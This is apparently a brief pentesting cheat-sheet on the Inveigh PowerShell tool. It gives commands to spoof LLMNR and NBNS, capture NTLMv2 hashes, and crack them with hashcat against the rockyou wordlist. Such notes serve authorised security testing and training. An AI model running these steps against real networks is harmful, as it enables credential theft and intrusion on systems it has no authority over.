# Inveigh

* Inveigh can listen to IPv4 and IPv6 and several other protocols, including `LLMNR`, DNS, `mDNS`, NBNS, `DHCPv6`, ICMPv6, `HTTP`, HTTPS, `SMB`, LDAP, `WebDAV`, and Proxy Auth.

### Using Inveigh

```powershell-session
Import-Module .\Inveigh.ps1
```

```powershell-session
(Get-Command Invoke-Inveigh).Parameters
```

#### LLMNR and NBNS spoofing

* Let's start Inveigh with LLMNR and NBNS spoofing, and output to the console and write to a file.

```powershell-session
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

```
cat Inveigh-NTLMv2.txt |clip
```

* copy hashes to [Hashcat](app://obsidian.md/Hashcat)and break

```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt 
```

## Reference

* [https://github.com/Kevin-Robertson/Inveigh](https://github.com/Kevin-Robertson/Inveigh)
* [https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1](https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1)
